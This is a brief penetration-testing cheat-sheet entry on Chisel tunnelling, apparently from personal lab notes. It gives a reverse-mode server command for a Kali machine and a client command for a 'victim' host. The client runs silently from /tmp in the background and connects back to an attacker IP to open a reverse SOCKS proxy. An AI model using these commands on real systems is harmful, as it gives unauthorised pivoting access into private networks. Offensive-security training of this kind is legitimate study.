### Chisel

Client/server model
chisel server on kali, chisel client on victim

chisel server --port 8080 --reverse
```
/tmp/chisel client 192.168.45.238:8080 R:socks > /dev/null 2>&1 &
```